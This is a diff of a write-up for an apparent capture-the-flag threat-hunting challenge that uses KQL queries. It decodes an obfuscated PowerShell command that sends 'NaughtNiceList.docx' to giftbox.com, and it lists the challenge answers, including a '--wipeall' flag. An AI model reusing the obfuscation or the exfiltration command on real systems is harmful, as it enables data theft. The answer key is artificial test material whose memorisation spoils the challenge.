@@ -141,9 +141,9 @@ The activity was performed at 2023-12-24T16:58:43Z.
 Base64 decoding leads to:  
 `[StRiNg]::JoIn( '', [ChaR[]](100, 111, 119, 110, 119, 105, 116, 104, 115, 97, 110, 116, 97, 46, 101, 120, 101, 32, 45, 101, 120, 102, 105, 108, 32, 67, 58, 92, 92, 68, 101, 115, 107, 116, 111, 112, 92, 92, 78, 97, 117, 103, 104, 116, 78, 105, 99, 101, 76, 105, 115, 116, 46, 100, 111, 99, 120, 32, 92, 92, 103, 105, 102, 116, 98, 111, 120, 46, 99, 111, 109, 92, 102, 105, 108, 101))|& ((gv '*Mdr*').NamE[3,11,2]-joiN`
 
-This is the de
-downwithsanta.exe -exfil C:\\Desktop\\NaughtNiceList.docx \\giftbox.com\file
+This is the decimal representation of the ASCII string `downwithsanta.exe -exfil C:\\Desktop\\NaughtNiceList.docx \\giftbox.com\file`
 
+**giftbox.com**
   
 
   
@@ -152,17 +152,17 @@ downwithsanta.exe -exfil C:\\Desktop\\NaughtNiceList.docx \\giftbox.com\file
 
 What is the name of the executable the attackers used in the final malicious command?
 
-Employees | where email_addr =="alabaster_snowball@santaworkshopgeeseislands.org" | project hostname | join ProcessEvents on $left.hostname==$right.hostname | where timestamp>=datetime("2023-12-02T10:12:42Z") | where process_commandline contains "PowerShell" | project timestamp,process_commandline
+`Employees | where email_addr =="alabaster_snowball@santaworkshopgeeseislands.org" | project hostname | join ProcessEvents on $left.hostname==$right.hostname | where timestamp>=datetime("2023-12-02T10:12:42Z") | where process_commandline contains "PowerShell" | project timestamp,process_commandline`
 
-(2023-12-25T10:44:27Z)
+The activity can be found at 2023-12-25T10:44:27Z.
 
-downwithsanta.exe
+**downwithsanta.exe**
 
   
 
 What was the command line flag used alongside this executable?
 
---wipeall
+**--wipeall**
 
   
 
@@ -176,5 +176,5 @@ Beware the Cube that Wombles
 
 **Achievement: KQL Kraken Hunt**
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTgwMzcyNTExMywtMjAxMDE5MjYzXX0=
+eyJoaXN0b3J5IjpbLTMzMjI0MjA3OSwtMjAxMDE5MjYzXX0=
 -->
